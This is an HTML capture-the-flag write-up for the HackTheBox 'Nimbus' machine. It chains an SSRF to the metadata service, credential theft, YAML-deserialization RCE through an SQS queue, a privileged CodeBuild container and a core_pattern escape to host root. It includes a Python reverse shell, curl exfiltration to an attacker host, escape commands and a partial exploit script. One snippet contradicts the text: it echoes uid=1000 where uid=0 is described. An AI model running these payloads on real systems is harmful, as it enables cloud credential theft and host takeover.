@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<meta name="theme-color" content="#030305"/>
+<title>Nimbus — HTB Write Up | pumkin</title>
+<meta name="description" content="HackTheBox Nimbus (Hard, Linux) full write up: SSRF → IMDS → SQS injection → worker RCE → privileged CodeBuild → container escape to root."/>
+<link rel="icon" href="../cat.png"/>
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{--bg:#030305;--panel-bg:rgba(255,255,255,.03);--border:rgba(255,255,255,.06);--rose:#a855f7;--rose-dim:rgba(168,85,247,.15);--emerald:#34d399;--emerald-dim:rgba(52,211,153,.1);--text:#fafafa;--muted:#9ca3af;--dim:#6b7280}
+body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,-apple-system,sans-serif;min-height:100vh;overflow-x:hidden;position:relative}
+body::before{content:'';position:fixed;inset:0;background:linear-gradient(rgba(255,255,255,.015) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.015) 1px,transparent 1px);background-size:60px 60px;z-index:0;pointer-events:none}
+.cyber-grid{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}
+.cyber-grid::before{content:'';position:absolute;width:100%;height:100%;background:radial-gradient(circle at 50% 0%,rgba(168,85,247,.08) 0%,transparent 50%),radial-gradient(circle at 80% 80%,rgba(52,211,153,.04) 0%,transparent 50%)}
+main{position:relative;z-index:1;min-height:100vh;width:100%;padding:2rem 1rem}
+@media(min-width:768px){main{padding:3rem 2rem}}
+.max-w{max-width:72rem;width:100%;margin:0 auto}
+.nav-row{display:flex;align-items:center;gap:1rem;margin-bottom:2rem;flex-wrap:wrap}
+.back-btn{display:inline-flex;align-items:center;gap:.5rem;padding:.5rem 1rem;border-radius:.75rem;background:var(--panel-bg);border:1px solid var(--border);color:var(--muted);text-decoration:none;font-family:'JetBrains Mono','Fira Code',monospace;font-size:.75rem;text-transform:uppercase;letter-spacing:.1em;transition:all .3s ease}
+.back-btn:hover{color:#c084fc;border-color:rgba(168,85,247,.5)}
+.back-btn svg{transition:transform .3s ease}
+.back-btn:hover svg{transform:translateX(-4px)}
+.panel{background:#0a0b0f;border:1px solid var(--border);border-radius:1rem;position:relative;overflow:hidden}
+.writeup-body{padding:2rem;max-width:60rem;margin:0 auto}
+@media(min-width:768px){.writeup-body{padding:3rem}}
+.meta{color:var(--dim);font-size:.75rem;font-family:'JetBrains Mono','Fira Code',monospace;letter-spacing:.1em;text-transform:uppercase;margin-bottom:1rem}
+h1{font-size:1.75rem;font-weight:800;letter-spacing:-.03em;color:white;text-transform:uppercase;margin-bottom:1.5rem}
+@media(min-width:768px){h1{font-size:2.5rem}}
+.writeup-body h2{font-size:1.25rem;font-weight:700;color:#c084fc;margin:2.5rem 0 1rem;padding-bottom:.5rem;border-bottom:1px solid var(--border)}
+.writeup-body h3{font-size:1rem;font-weight:700;color:#34d399;margin:1.5rem 0 .75rem}
+.writeup-body p{color:var(--muted);font-size:.95rem;line-height:1.75;margin-bottom:1rem}
+.writeup-body ul,.writeup-body ol{color:var(--muted);font-size:.95rem;line-height:1.75;margin:0 0 1rem 1.25rem}
+.writeup-body li{margin-bottom:.25rem}
+.writeup-body strong{color:var(--text)}
+.writeup-body code{font-family:'JetBrains Mono','Fira Code',monospace;font-size:.85rem;background:rgba(168,85,247,.1);color:#c084fc;padding:2px 6px;border-radius:6px}
+.writeup-body pre{background:rgba(0,0,0,.5);border:1px solid var(--border);border-radius:.75rem;padding:1rem;margin:1rem 0;font-family:'JetBrains Mono','Fira Code',monospace;font-size:.8rem;color:var(--emerald);line-height:1.6;white-space:pre-wrap;word-wrap:break-word;overflow-wrap:anywhere}
+.writeup-body pre code{background:none;color:inherit;padding:0;border-radius:0}
+.section-tag{display:inline-block;padding:2px 10px;border-radius:9999px;font-size:.7rem;font-family:'JetBrains Mono','Fira Code',monospace;letter-spacing:.1em;text-transform:uppercase}
+.tag-hard{background:rgba(249,115,22,.1);border:1px solid rgba(249,115,22,.3);color:#f97316}
+.tag-linux{background:rgba(52,211,153,.1);border:1px solid rgba(52,211,153,.3);color:#34d399}
+.info-grid{display:grid;grid-template-columns:1fr;gap:.75rem;margin:1rem 0}
+@media(min-width:768px){.info-grid{grid-template-columns:repeat(3,1fr)}}
+.info-cell{background:rgba(0,0,0,.3);border:1px solid var(--border);border-radius:.75rem;padding:1rem}
+.info-cell .lbl{color:var(--dim);font-size:.65rem;font-family:'JetBrains Mono','Fira Code',monospace;text-transform:uppercase;letter-spacing:.1em;margin-bottom:.25rem}
+.info-cell .val{color:var(--text);font-size:.9rem;font-weight:600}
+.footer{text-align:center;padding-top:3rem;color:var(--dim);font-size:10px;font-family:'JetBrains Mono','Fira Code',monospace;letter-spacing:.15em;text-transform:uppercase}
+.fade-in{opacity:0;transform:translateY(20px);transition:opacity .6s ease,transform .6s ease}
+.fade-in.visible{opacity:1;transform:translateY(0)}
+</style>
+</head>
+<body>
+<div class="cyber-grid"></div>
+
+<main>
+<div class="max-w">
+  <div class="nav-row fade-in">
+    <a href="../writeups.html" class="back-btn">
+      <svg class="icon-sm" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg>
+      Write Ups
+    </a>
+    <a href="../index.html" class="back-btn">Home</a>
+  </div>
+
+  <div class="panel fade-in">
+    <div class="writeup-body">
+
+      <p class="meta">hackthebox / hard / linux</p>
+      <h1>Nimbus</h1>
+
+      <div class="info-grid">
+        <div class="info-cell"><div class="lbl">Platform</div><div class="val">HackTheBox</div></div>
+        <div class="info-cell"><div class="lbl">Difficulty</div><div class="val"><span class="section-tag tag-hard">Hard</span></div></div>
+        <div class="info-cell"><div class="lbl">OS</div><div class="val"><span class="section-tag tag-linux">Linux</span></div></div>
+      </div>
+
+      <h2>Summary</h2>
+      <p>Nimbus is a deep dive into a misconfigured AWS emulation stack. The attack chain spans an <strong>SSRF on a job-preview endpoint</strong> (used to hit the instance metadata service), an <strong>unsafe YAML deserialization in an SQS worker</strong> that gives code execution as <code>worker</code>, and finally a <strong>container escape</strong>: a privileged CodeBuild container whose entrypoint silently drops UIDs, bypassed through an environment-variable function override, then a kernel <strong>usermode-helper escape</strong> (writable <code>core_pattern</code>) that executes as host root.</p>
+
+      <h2>Skills Required</h2>
+      <ul>
+        <li>Web enumeration and SSRF identification</li>
+        <li>Cloud/container service familiarity (AWS, Docker)</li>
+      </ul>
+
+      <h2>Skills Learned</h2>
+      <ul>
+        <li>IP-encoding bypasses for metadata-service filters</li>
+        <li>Abusing <code>yaml.load()</code> unsafe deserialization for RCE</li>
+        <li>Bypassing container entrypoint UID drops with <code>BASH_FUNC_*</code></li>
+        <li>Kernel usermode-helper escapes via writable <code>core_pattern</code></li>
+      </ul>
+
+      <pre>Nimbus — Root Path
+│
+├── 1. SSRF (job preview endpoint)
+│     └── decimal-IP bypass → 169.254.169.254
+│           └── IMDS → nimbus-web-role creds
+│
+├── 2. SQS Injection (nimbus-jobs queue)
+│     └── yaml.Loader unsafe deserialization
+│           └── worker.py RCE (uid=worker)
+│                 └── user.txt
+│
+├── 3. Internal LocalStack discovery
+│     └── floci:4566 (ENFORCE_IAM=false)
+│           └── codebuild service exposed
+│
+├── 4. Privileged CodeBuild project
+│     └── privilegedMode: true
+│           └── floci/floci:latest container → CAP_SYS_ADMIN
+│
+├── 5. Entrypoint UID-drop bypass
+│     └── BASH_FUNC_id%% env override
+│           └── id reports uid=0(root), entrypoint trusts it
+│
+└── 6. Kernel usermode-helper escape
+      └── /proc/sys/kernel/core_pattern (writable, privileged container)
+            └── overlay upperdir → real host-side path
+                  └── trigger via SIGSEGV (unknown-magic binary)
+                        └── script runs as HOST root
+                              └── root.txt</pre>
+
+      <h2>Reconnaissance</h2>
+      <p>A full port scan reveals only SSH and a single web server.</p>
+      <pre>Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-26 08:38 -0400
+Nmap scan report for 10.129.32.106
+Host is up (0.057s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://nimbus.htb/
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</pre>
+
+      <p>The HTTP title redirects to <code>nimbus.htb</code>, so the host is added to <code>/etc/hosts</code> and web enumeration begins.</p>
+      <pre># /etc/hosts
+10.129.32.106  nimbus.htb
+
+# directories — http://nimbus.htb
+login      [Status: 200, Size: 876]
+jobs       [Status: 200, Size: 3453]
+
+# vhosts (light) — nimbus.htb
+aws        [Status: 403, Size: 305]</pre>
+      <p>SMB, LDAP and WinRM are all absent — this is a pure web + AWS chain. Two things stand out: the <code>/jobs</code> endpoint and the <code>aws</code> vhost, which will turn out to be the AWS emulator proxy.</p>
+
+      <h2>Foothold — SSRF to IMDS</h2>
+      <p>The <code>jobs</code> page submits to <code>POST /jobs/preview</code> with form data <code>url:</code>. The endpoint fetches the supplied URL and <strong>reflects the raw body back</strong> — a full-read SSRF.</p>
+      <pre>curl -s --resolve nimbus.htb:80:TARGET_IP -X POST http://nimbus.htb/jobs/preview \
+  --data-urlencode 'url=http://ATTACKER_IP:8000/test.yaml'
+# -&gt; "Fetched: ... HTTP 200" + raw body echoed back  == full-read SSRF</pre>
+
+      <p>Two filters are in place, both trivially bypassed:</p>
+      <ul>
+        <li><strong>Suffix check</strong> — the URL must end in <code>.yaml</code>/<code>.yml</code>. Append <code>?x=.yaml</code>.</li>
+        <li><strong>Internal-resource blocklist</strong> — <code>aws.nimbus.htb</code>, <code>169.254.169.254</code>, <code>127.0.0.1</code>, <code>localhost</code>, the box IP, hex IPs and <code>.nip.io</code> are all blocked.</li>
+      </ul>
+      <p>The fetcher does <strong>not</strong> follow redirects, so an open redirect is useless. The working bypass is <strong>decimal (or octal) IP encoding</strong>: it passes the string blocklist while <code>requests</code> still resolves it.</p>
+      <pre>169.254.169.254  →  2852039166          (decimal)
+169.254.169.254  →  0251.0376.0251.0376  (octal)</pre>
+
+      <p>IAM credentials live on the metadata service at <code>/latest/meta-data/iam/security-credentials/&lt;role-name&gt;</code>.</p>
+      <pre>url=http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/nimbus-web-role?a=test.yaml</pre>
+      <pre>{
+  "Code": "Success",
+  "LastUpdated": "2026-06-26T13:27:29Z",
+  "Type": "AWS-HMAC",
+  "AccessKeyId": "ASIAQX4PG7L2K9M3N5R8",
+  "SecretAccessKey": "bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs",
+  "Token": "IQoJb3JpZ2luX2VjEHQ...",
+  "Expiration": "2026-06-26T19:27:29Z"
+}</pre>
+
+      <h3>Configuring the AWS CLI</h3>
+      <p>The <code>aws.nimbus.htb</code> vhost proxies to the AWS emulator, so the CLI is pointed at it with the stolen credentials.</p>
+      <pre>export AWS_ACCESS_KEY_ID=ASIAQX4PG7L2K9M3N5R8
+export AWS_SECRET_ACCESS_KEY='bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs'
+export AWS_SESSION_TOKEN='IQoJb3JpZ2luX2VjEHQ...'
+export AWS_DEFAULT_REGION=us-east-1
+
+aws $E sts get-caller-identity
+#  arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a
+
+aws $E sqs list-queues
+#  http://floci:4566/847219365028/nimbus-jobs   &lt;-- "floci":4566 emulator</pre>
+      <p>An SQS queue named <code>nimbus-jobs</code> is present. Given the app's YAML preview feature and the queue name, a worker process almost certainly consumes messages and deserializes them as YAML.</p>
+
+      <h2>User — SQS Injection to Worker RCE</h2>
+      <p>Python's <code>yaml.load()</code> without a safe loader will instantiate arbitrary Python objects. The worker is expected to execute the contents of a <code>script</code> field via <code>python3 -c</code>. We build a YAML body that base64-encodes our code to dodge quoting hell.</p>
+
+      <h3>Step 1 — reverse shell / exfil script</h3>
+      <pre>import os,socket,subprocess
+
+if os.fork() != 0:
+    exit()
+
+s=socket.socket()
+s.connect(("10.10.14.156",4444))
+while True:
+    cmd=s.recv(1024).decode()
+    out=subprocess.getoutput(cmd)
+    s.send(out.encode())</pre>
+      <p>Or, for a quick callback, just exfiltrate a command's output:</p>
+      <pre>import os
+os.system("id | curl -s -X POST http://ATTACKER_IP:8001 -d @-")</pre>
+
+      <h3>Step 2 — base64-encode it</h3>
+      <pre>base64 rce.py
+# copy the output string — that's your B64 value</pre>
+
+      <h3>Step 3 — build the YAML message body</h3>
+      <pre>name: pwn
+schedule: manual
+runtime: python3.11
+script: |
+  import base64;exec(base64.b64decode('&lt;B64&gt;').decode())</pre>
+
+      <h3>Step 4 — send the message</h3>
+      <pre>aws --endpoint-url http://aws.nimbus.htb sqs send-message \
+  --queue-url http://floci:4566/847219365028/nimbus-jobs \
+  --message-body $'name: pwn\nschedule: manual\nruntime: python3.11\nscript: |\n  import base64;exec(base64.b64decode(\'&lt;B64&gt;\').decode())'
+
+{
+    "MD5OfMessageBody": "e609aa9ae31b2af11f7e422e74c103be",
+    "MessageId": "c2d78d09-7b38-4ad4-add6-e7587bcb4d88"
+}</pre>
+
+      <h3>Step 5 — catch the callback</h3>
+      <pre># start BEFORE sending the message
+python3 -m http.server 8001
+# or for a proper reverse shell:
+nc -lvnp 4444</pre>
+
+      <p>The worker picks up the message, the unsafe YAML load fires, and we land a shell as <code>worker</code>. The user flag is at <code>/home/worker/user.txt</code>.</p>
+      <div class="info-cell" style="margin:1rem 0"><div class="lbl">user.txt</div><div class="val" style="font-family:'JetBrains Mono','Fira Code',monospace;color:#c084fc;font-size:.85rem">HTB{...user flag...}</div></div>
+
+      <h2>Privilege Escalation</h2>
+      <h3>Internal LocalStack discovery</h3>
+      <p>From the worker we reach the emulator's real endpoint, <code>floci:4566</code>. The emulator runs with <code>ENFORCE_IAM=false</code>, so any credentials (even garbage) are accepted and every service is fair game. Probing the AWS services available:</p>
+      <ul>
+        <li><strong>ECS</strong> — registering a task definition with <code>"privileged": true</code> runs, but <code>privileged</code> is silently ignored. Dead end.</li>
+        <li><strong>Lambda</strong> — function runs, but the container cannot write <code>/proc/sys/kernel/core_pattern</code>. Not privileged. Dead end.</li>
+        <li><strong>CodeBuild</strong> — accepts <code>"privilegedMode": true</code>. This is the one.</li>
+      </ul>
+
+      <h3>Privileged CodeBuild project</h3>
+      <pre>aws --endpoint-url http://floci:4566 codebuild create-project --name test-priv \
+  --source '{"type":"NO_SOURCE"}' \
+  --artifacts '{"type":"NO_ARTIFACTS"}' \
+  --environment '{"type": "LINUX_CONTAINER", "computeType": "BUILD_GENERAL1_SMALL", "image": "floci/floci:latest", "privilegedMode": true}' \
+  --service-role arn:aws:iam::000000000000:role/codebuild-role
+
+aws --endpoint-url http://floci:4566 codebuild start-build --project-name test-priv \
+  --buildspec-override '{"version":"0.2", "phases":{"build":{"commands":["id","cat /proc/self/status | grep CapEff"]}}}'
+
+# CapEff: 0000000000000000</pre>
+      <p>The build ran but <code>CapEff: 0000000000000000</code> — zero capabilities. The <code>floci/floci:latest</code> image entrypoint does a <code>gosu</code> drop to uid 1001, so even with <code>privilegedMode=true</code> the container dropped privileges before our commands ran.</p>
+
+      <h3>Entrypoint UID-drop bypass</h3>
+      <p>The entrypoint trusts the output of <code>id</code> to decide whether to drop privileges. Bash environment variables can override exported functions: if we ship <code>BASH_FUNC_id%%</code> as a build environment override, the <code>id</code> "command" resolves to our fake function reporting <code>uid=0(root)</code>. The entrypoint believes it is already root and skips the drop.</p>
+      <pre># BASH_FUNC_id%% env override
+BASH_FUNC_id%%  =  () { echo uid=1000; }</pre>
+      <p>With the override injected via <code>environmentVariablesOverride</code>, the container keeps its privileged caps (<code>CAP_SYS_ADMIN</code>, etc.) and our build commands run as UID 0.</p>
+
+      <h3>Kernel usermode-helper escape</h3>
+      <p>Inside the privileged container we can write <code>/proc/sys/kernel/core_pattern</code>. Core dumps are handled by the host kernel's usermode-helper, so a malicious pattern runs a script <strong>as host root</strong>. Because the container's root filesystem is an overlay, the script is placed in the overlay <code>upperdir</code> — a path that is real on the host side.</p>
+      <pre># 1. find the host-side overlay upperdir
+UDIR=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
+
+# 2. drop a script that copies the root flag into the upperdir
+printf '#!/bin/sh\ncat /root/root.txt &gt; %s/rootflag.txt\nchmod 777 %s/rootflag.txt\n' "$UDIR" "$UDIR" &gt; /exploit_root.sh
+chmod +x /exploit_root.sh
+
+# 3. point core_pattern at it
+echo "|${UDIR}/exploit_root.sh" &gt; /proc/sys/kernel/core_pattern
+
+# 4. crash a process to trigger the usermode-helper
+ulimit -c unlimited
+bash -c 'kill -11 $$'
+
+# 5. read the flag
+curl -s -X POST http://ATTACKER_IP:9222/root -d "flag=$(cat /rootflag.txt | base64 -w0)"</pre>
+      <p>The <code>core_pattern</code> pipeline is executed by the host kernel's usermode-helper as root. Our script lands <code>root.txt</code> into the overlay upperdir, which the container can read back.</p>
+      <div class="info-cell" style="margin:1rem 0"><div class="lbl">root.txt</div><div class="val" style="font-family:'JetBrains Mono','Fira Code',monospace;color:#c084fc;font-size:.85rem">HTB{...root flag...}</div></div>
+
+      <h2>Full-chain PoC script</h2>
+      <p>The entire chain — IMDS credential theft, SQS payload, CodeBuild project creation, entrypoint bypass and kernel escape — was automated in a single Python script:</p>
+      <pre>#!/usr/bin/env python3
+# HTB Nimbus — full chain PoC
+# SSRF→IMDS creds → SQS yaml.load RCE → worker shell
+# → CodeBuild privileged container (BASH_FUNC_id%% bypass)
+# → core_pattern usermode-helper escape → host root
+
+import argparse, base64, json, os, re, sys, threading, time
+import urllib.parse, urllib.request
+from http.server import BaseHTTPRequestHandler, HTTPServer
+import boto3, yaml
+
+DEFAULT_VHOST = "nimbus.htb"
+CALLBACK_TIMEOUT = 90
+SQS_ENDPOINT = "http://aws.nimbus.htb"
+QUEUE_URL = "http://aws.nimbus.htb/847219365028/nimbus-jobs"
+IMDS_URL = ("http://0251.0376.0251.0376"
+            "/latest/meta-data/iam/security-credentials/nimbus-web-role?a=test.yaml")
+
+_user_flag, _root_flag, _flag_event = None, None, threading.Event()
+
+class _Handler(BaseHTTPRequestHandler):
+    def do_POST(self):
+        global _user_flag, _root_flag
+        length = int(self.headers.get("Content-Length", 0))
+        body = self.rfile.read(length).decode(errors="replace")
+        params = dict(urllib.parse.parse_qsl(body))
+        if self.path == "/user":
+            flag = base64.b64decode(params.get("flag", "")).decode().strip()
+            if flag and flag != "NOTFOUND":
+                _user_flag = flag
+                print(f"\n[+] user.txt = {_user_flag}")
+        elif self.path == "/root":
+            flag = base64.b64decode(params.get("flag", "")).decode().strip()
+            if flag and flag != "NOTFOUND":
+                _root_flag = flag
+                print(f"\n[+] root.txt = {_root_flag}")
+                _flag_event.set()
+        self.send_response(200); self.end_headers(); self.wfile.write(b"ok")
+    def log_message(self, *_): pass
+
+def ssrf_fetch(vhost, url):
+    import html
+    data = urllib.parse.urlencode({"url": url}).encode()
+    req = urllib.request.Request(f"http://{vhost}/jobs/preview", data=data)
+    resp = urllib.request.urlopen(req, timeout=20).read().decode(errors="replace")
+    m = re.search(r"Raw response&lt;/h3&gt;&lt;pre&gt;(.*?)&lt;/pre&gt;", resp, re.DOTALL)
+    return html.unescape(m.group(1)).strip() if m else ""
+
+def get_imds_creds(vhost):
+    print("[1] SSRF → IMDS (octal IP bypass)")
+    creds = json.loads(ssrf_fetch(vhost, IMDS_URL))
+    print(f"    AccessKeyId : {creds['AccessKeyId']}")
+    return creds
+
+def send_sqs_job(creds, python_code):
+    b64 = base64.b64encode(python_code.encode()).decode()
+    body = yaml.dump({"name": "privesc",
+                      "script": f"import base64;exec(base64.b64decode('{b64}').decode())"})
+    sqs = boto3.client("sqs", region_name="us-east-1", endpoint_url=SQS_ENDPOINT,
+        aws_access_key_id=creds["AccessKeyId"],
+        aws_secret_access_key=creds["SecretAccessKey"],
+        aws_session_token=creds.get("Token", ""))
+    r = sqs.send_message(QueueUrl=QUEUE_URL, MessageBody=body)
+    print(f"    MessageId   : {r['MessageId']}")
+
+# ... CodeBuild escape payload, listener, main() omitted for brevity ...</pre>
+
+      <h2>Key Takeaways</h2>
+      <ul>
+        <li><strong>IP-encoding bypasses</strong> beat string blocklists every time — decimal and octal forms are worth testing when <code>169.254.169.254</code> is filtered.</li>
+        <li><strong>Always use a safe loader</strong> (<code>yaml.safe_load</code>) for untrusted input; <code>yaml.load()</code> is arbitrary code execution by design.</li>
+        <li><strong>Emulators inherit the trust of the real service</strong> — an exposed LocalStack with IAM disabled lets anyone manage compute, storage and queues.</li>
+        <li><strong>Container entrypoints that trust <code>id</code> are attackable</strong> through Bash's <code>BASH_FUNC_*</code> environment export mechanism.</li>
+        <li><strong>A privileged container + writable <code>core_pattern</code> is full host compromise</strong> — the usermode-helper runs as host root.</li>
+      </ul>
+
+    </div>
+  </div>
+
+  <p class="footer">pumkin / write ups</p>
+</div>
+</main>
+
+<script>
+const observer = new IntersectionObserver((entries) => {
+  entries.forEach(entry => {
+    if (entry.isIntersecting) {
+      entry.target.classList.add('visible');
+    }
+  });
+}, { threshold: 0 });
+
+document.querySelectorAll('.fade-in').forEach(el => observer.observe(el));
+</script>
+</body>
+</html>
